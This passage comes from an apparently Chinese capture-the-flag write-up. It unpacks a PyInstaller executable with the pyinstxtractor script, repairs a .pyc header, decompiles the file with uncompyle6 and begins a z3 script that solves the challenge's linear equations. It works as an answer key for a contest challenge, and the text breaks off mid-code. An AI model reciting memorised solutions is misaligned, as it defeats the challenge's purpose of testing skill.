class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkFile</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'[*] Processing &#123;0&#125;'</span>.format(self.filePath))</span><br><span class="line">        <span class="comment"># Check if it is a 2.0 archive</span></span><br><span class="line">        self.fPtr.seek(self.fileSize - self.PYINST20_COOKIE_SIZE, os.SEEK_SET)</span><br><span class="line">        magicFromFile = self.fPtr.read(len(self.MAGIC))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> magicFromFile == self.MAGIC:</span><br><span class="line">            self.pyinstVer = <span class="number">20</span>     <span class="comment"># pyinstaller 2.0</span></span><br><span class="line">            print(<span class="string">'[*] Pyinstaller version: 2.0'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check for pyinstaller 2.1+ before bailing out</span></span><br><span class="line">        self.fPtr.seek(self.fileSize - self.PYINST21_COOKIE_SIZE, os.SEEK_SET)</span><br><span class="line">        magicFromFile = self.fPtr.read(len(self.MAGIC))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> magicFromFile == self.MAGIC:</span><br><span class="line">            print(<span class="string">'[*] Pyinstaller version: 2.1+'</span>)</span><br><span class="line">            self.pyinstVer = <span class="number">21</span>     <span class="comment"># pyinstaller 2.1+</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">'[*] Error : Unsupported pyinstaller version or not a pyinstaller archive'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getCArchiveInfo</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.pyinstVer == <span class="number">20</span>:</span><br><span class="line">                self.fPtr.seek(self.fileSize - self.PYINST20_COOKIE_SIZE, os.SEEK_SET)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Read CArchive cookie</span></span><br><span class="line">                (magic, lengthofPackage, toc, tocLen, self.pyver) = \</span><br><span class="line">                struct.unpack(<span class="string">'!8siiii'</span>, self.fPtr.read(self.PYINST20_COOKIE_SIZE))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> self.pyinstVer == <span class="number">21</span>:</span><br><span class="line">                self.fPtr.seek(self.fileSize - self.PYINST21_COOKIE_SIZE, os.SEEK_SET)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Read CArchive cookie</span></span><br><span class="line">                (magic, lengthofPackage, toc, tocLen, self.pyver, pylibname) = \</span><br><span class="line">                struct.unpack(<span class="string">'!8siiii64s'</span>, self.fPtr.read(self.PYINST21_COOKIE_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[*] Error : The file is not a pyinstaller archive'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">'[*] Python version: &#123;0&#125;'</span>.format(self.pyver))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Overlay is the data appended at the end of the PE</span></span><br><span class="line">        self.overlaySize = lengthofPackage</span><br><span class="line">        self.overlayPos = self.fileSize - self.overlaySize</span><br><span class="line">        self.tableOfContentsPos = self.overlayPos + toc</span><br><span class="line">        self.tableOfContentsSize = tocLen</span><br><span class="line"></span><br><span class="line">        print(<span class="string">'[*] Length of package: &#123;0&#125; bytes'</span>.format(self.overlaySize))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseTOC</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># Go to the table of contents</span></span><br><span class="line">        self.fPtr.seek(self.tableOfContentsPos, os.SEEK_SET)</span><br><span class="line"></span><br><span class="line">        self.tocList = []</span><br><span class="line">        parsedLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Parse table of contents</span></span><br><span class="line">        <span class="keyword">while</span> parsedLen &lt; self.tableOfContentsSize:</span><br><span class="line">            (entrySize, ) = struct.unpack(<span class="string">'!i'</span>, self.fPtr.read(<span class="number">4</span>))</span><br><span class="line">            nameLen = struct.calcsize(<span class="string">'!iiiiBc'</span>)</span><br><span class="line"></span><br><span class="line">            (entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name) = \</span><br><span class="line">            struct.unpack( \</span><br><span class="line">                <span class="string">'!iiiBc&#123;0&#125;s'</span>.format(entrySize - nameLen), \</span><br><span class="line">                self.fPtr.read(entrySize - <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">            name = name.decode(<span class="string">'utf-8'</span>).rstrip(<span class="string">'\0'</span>)</span><br><span class="line">            <span class="keyword">if</span> len(name) == <span class="number">0</span>:</span><br><span class="line">                name = str(uniquename())</span><br><span class="line">                print(<span class="string">'[!] Warning: Found an unamed file in CArchive. Using random name &#123;0&#125;'</span>.format(name))</span><br><span class="line"></span><br><span class="line">            self.tocList.append( \</span><br><span class="line">                                CTOCEntry(                      \</span><br><span class="line">                                    self.overlayPos + entryPos, \</span><br><span class="line">                                    cmprsdDataSize,             \</span><br><span class="line">                                    uncmprsdDataSize,           \</span><br><span class="line">                                    cmprsFlag,                  \</span><br><span class="line">                                    typeCmprsData,              \</span><br><span class="line">                                    name                        \</span><br><span class="line">                                ))</span><br><span class="line"></span><br><span class="line">            parsedLen += entrySize</span><br><span class="line">        print(<span class="string">'[*] Found &#123;0&#125; files in CArchive'</span>.format(len(self.tocList)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extractFiles</span><span class="params">(self, custom_dir=None)</span>:</span></span><br><span class="line">        print(<span class="string">'[*] Beginning extraction...please standby'</span>)</span><br><span class="line">        <span class="keyword">if</span> custom_dir <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            extractionDir = os.path.join(os.getcwd(), os.path.basename(self.filePath) + <span class="string">'_extracted'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractionDir):</span><br><span class="line">                os.mkdir(extractionDir)</span><br><span class="line"></span><br><span class="line">            os.chdir(extractionDir)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(custom_dir):</span><br><span class="line">                os.makedirs(custom_dir)</span><br><span class="line">            os.chdir(custom_dir)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> entry <span class="keyword">in</span> self.tocList:</span><br><span class="line">            basePath = os.path.dirname(entry.name)</span><br><span class="line">            <span class="keyword">if</span> basePath != <span class="string">''</span>:</span><br><span class="line">                <span class="comment"># Check if path exists, create if not</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(basePath):</span><br><span class="line">                    os.makedirs(basePath)</span><br><span class="line"></span><br><span class="line">            self.fPtr.seek(entry.position, os.SEEK_SET)</span><br><span class="line">            data = self.fPtr.read(entry.cmprsdDataSize)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> entry.cmprsFlag == <span class="number">1</span>:</span><br><span class="line">                data = zlib.decompress(data)</span><br><span class="line">                <span class="comment"># Malware may tamper with the uncompressed size</span></span><br><span class="line">                <span class="comment"># Comment out the assertion in such a case</span></span><br><span class="line">                <span class="keyword">assert</span> len(data) == entry.uncmprsdDataSize <span class="comment"># Sanity Check</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> open(entry.name, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> entry.typeCmprsData == <span class="string">b'z'</span>:</span><br><span class="line">                self._extractPyz(entry.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_extractPyz</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        dirName =  name + <span class="string">'_extracted'</span></span><br><span class="line">        <span class="comment"># Create a directory for the contents of the pyz</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirName):</span><br><span class="line">            os.mkdir(dirName)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> open(name, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pyzMagic = f.read(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">assert</span> pyzMagic == <span class="string">b'PYZ\0'</span> <span class="comment"># Sanity Check</span></span><br><span class="line"></span><br><span class="line">            pycHeader = f.read(<span class="number">4</span>) <span class="comment"># Python magic value</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> imp.get_magic() != pycHeader:</span><br><span class="line">                print(<span class="string">'[!] Warning: The script is running in a different python version than the one used to build the executable'</span>)</span><br><span class="line">                print(<span class="string">'    Run this script in Python&#123;0&#125; to prevent extraction errors(if any) during unmarshalling'</span>.format(self.pyver))</span><br><span class="line"></span><br><span class="line">            (tocPosition, ) = struct.unpack(<span class="string">'!i'</span>, f.read(<span class="number">4</span>))</span><br><span class="line">            f.seek(tocPosition, os.SEEK_SET)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                toc = marshal.load(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">'[!] Unmarshalling FAILED. Cannot extract &#123;0&#125;. Extracting remaining files.'</span>.format(name))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            print(<span class="string">'[*] Found &#123;0&#125; files in PYZ archive'</span>.format(len(toc)))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># From pyinstaller 3.1+ toc is a list of tuples</span></span><br><span class="line">            <span class="keyword">if</span> type(toc) == list:</span><br><span class="line">                toc = dict(toc)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> toc.keys():</span><br><span class="line">                (ispkg, pos, length) = toc[key]</span><br><span class="line">                f.seek(pos, os.SEEK_SET)</span><br><span class="line"></span><br><span class="line">                fileName = key</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># for Python &gt; 3.3 some keys are bytes object some are str object</span></span><br><span class="line">                    fileName = key.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Make sure destination directory exists, ensuring we keep inside dirName</span></span><br><span class="line">                destName = os.path.join(dirName, fileName.replace(<span class="string">".."</span>, <span class="string">"__"</span>))</span><br><span class="line">                destDirName = os.path.dirname(destName)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(destDirName):</span><br><span class="line">                    os.makedirs(destDirName)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data = f.read(length)</span><br><span class="line">                    data = zlib.decompress(data)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">'[!] Error: Failed to decompress &#123;0&#125;, probably encrypted. Extracting as is.'</span>.format(fileName))</span><br><span class="line">                    open(destName + <span class="string">'.pyc.encrypted'</span>, <span class="string">'wb'</span>).write(data)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">with</span> open(destName + <span class="string">'.pyc'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> pycFile:</span><br><span class="line">                    pycFile.write(pycHeader)      <span class="comment"># Write pyc magic</span></span><br><span class="line">                    pycFile.write(<span class="string">b'\0'</span> * <span class="number">4</span>)      <span class="comment"># Write timestamp</span></span><br><span class="line">                    <span class="keyword">if</span> self.pyver &gt;= <span class="number">33</span>:</span><br><span class="line">                        pycFile.write(<span class="string">b'\0'</span> * <span class="number">4</span>)  <span class="comment"># Size parameter added in Python 3.3</span></span><br><span class="line">                    pycFile.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'[*] Usage: pyinstxtractor.py &lt;filename&gt;'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        arch = PyInstArchive(sys.argv[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> arch.open():</span><br><span class="line">            <span class="keyword">if</span> arch.checkFile():</span><br><span class="line">                <span class="keyword">if</span> arch.getCArchiveInfo():</span><br><span class="line">                    arch.parseTOC()</span><br><span class="line">                    arch.extractFiles()</span><br><span class="line">                    arch.close()</span><br><span class="line">                    print(<span class="string">'[*] Successfully extracted pyinstaller archive: &#123;0&#125;'</span>.format(sys.argv[<span class="number">1</span>]))</span><br><span class="line">                    print(<span class="string">''</span>)</span><br><span class="line">                    print(<span class="string">'You can now use a python decompiler on the pyc files within the extracted directory'</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">            arch.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>解包成功会在脚本运行目录得到一个目录</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030823825/0" alt=""></p><p>目录里面会有一个同名文件(当时这个题目是有名字的,就叫login.exe)</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030823878/0" alt=""></p><p>然后用winhex打开login和下面的ospath</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030823919/0" alt=""></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824003/0" alt=""></p><p>由于这个login的文件头是被删掉了的</p><p>所以要从其他的同版本的文件里面找到这个文件头并且加在前面</p><p>这里即</p><blockquote><p>33 0D 0D 0A 70 79 69 30 59 0C 00 00</p></blockquote><p>因为login的第一位是E3</p><p>ospath里面E3前面的就是这几位</p><p>winhex可以直接很方便的ctrl cv</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824056/0" alt=""></p><p>加上文件头以后文件夹里其他文件就没用了,再在这个文件后面加上.pyc</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824123/0" alt=""></p><p>这样第一步exe-&gt;pyc就成功了</p><h2 id="解密pyc-gt-py"><a href="#解密pyc-gt-py" class="headerlink" title="解密pyc-&gt;py"></a>解密pyc-&gt;py</h2><p>需要pip3 install uncompyle6</p><p>uncompyle6使用很简单就一句话的事</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824196/0" alt=""></p><p>也可以直接保存为文件</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824267/0" alt=""></p><p>这样第二部pyc-&gt;py就完成了</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>与uncompyle6同功能的还有decompyle3,安装和使用基本相同</p><p>有时候某一个并不能够解密,这时候可以试试另一个,实在不行就找网上的</p><p><a href="http://tools.bugscaner.com/decompyle/" target="_blank" rel="noopener">http://tools.bugscaner.com/decompyle/</a></p><h2 id="z3解题"><a href="#z3解题" class="headerlink" title="z3解题"></a>z3解题</h2><p>安装一句话</p><blockquote><p>pip3 install z3-solver</p></blockquote><p>解密出来的py文件逻辑很清晰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.8 (tags/v3.7.8:4b47a5b6ba, Jun 28 2020, 08:53:46) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: login.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 3161 bytes</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">input1 = input(<span class="string">'input something:'</span>)</span><br><span class="line"><span class="keyword">if</span> len(input1) != <span class="number">14</span>:</span><br><span class="line">    print(<span class="string">'Wrong length!'</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    code = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        code.append(ord(input1[i]) ^ ord(input1[(i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line">    code.append(ord(input1[<span class="number">13</span>]))</span><br><span class="line">    a1 = code[<span class="number">2</span>]</span><br><span class="line">    a2 = code[<span class="number">1</span>]</span><br><span class="line">    a3 = code[<span class="number">0</span>]</span><br><span class="line">    a4 = code[<span class="number">3</span>]</span><br><span class="line">    a5 = code[<span class="number">4</span>]</span><br><span class="line">    a6 = code[<span class="number">5</span>]</span><br><span class="line">    a7 = code[<span class="number">6</span>]</span><br><span class="line">    a8 = code[<span class="number">7</span>]</span><br><span class="line">    a9 = code[<span class="number">9</span>]</span><br><span class="line">    a10 = code[<span class="number">8</span>]</span><br><span class="line">    a11 = code[<span class="number">10</span>]</span><br><span class="line">    a12 = code[<span class="number">11</span>]</span><br><span class="line">    a13 = code[<span class="number">12</span>]</span><br><span class="line">    a14 = code[<span class="number">13</span>]</span><br><span class="line">    <span class="keyword">if</span> (a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>) &amp; (a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>) &amp; (a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>) &amp; (a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) &amp; (a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>) &amp; (a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>) &amp; (a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) &amp; (a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>) &amp; (a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>) &amp; (a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>) &amp; (a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>) &amp; (a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) &amp; (a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>):</span><br><span class="line">        print(<span class="string">'flag is GWHT&#123;md5(your_input)&#125;'</span>)</span><br><span class="line">        print(<span class="string">'Congratulations and have fun!'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'Sorry,plz try again...'</span>)</span><br><span class="line"><span class="comment"># okay decompiling C:\Users\Administrator\Desktop\login.pyc</span></span><br></pre></td></tr></table></figure><p>可以看出来是先检测输入长度</p><p>如果不是14位就输出错误并退出</p><p>然后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">13</span>;i++)</span><br><span class="line">code[i]^=input[i];</span><br></pre></td></tr></table></figure><p>然后再把code换一下位置</p><p>在验证换位置之后的是否正确</p><p>验证方法为多项式</p><p>最后如果验证成功就把输入进行md5再用GWHT{}包起来即为flag</p><p>关键就在验证了</p><p>话不多说先上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line">a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14=z3.BitVecs(<span class="string">'a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14'</span>,<span class="number">32</span>)</span><br><span class="line">s=z3.Solver()</span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>   )</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>      )</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span> )</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>  )</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>  )</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span 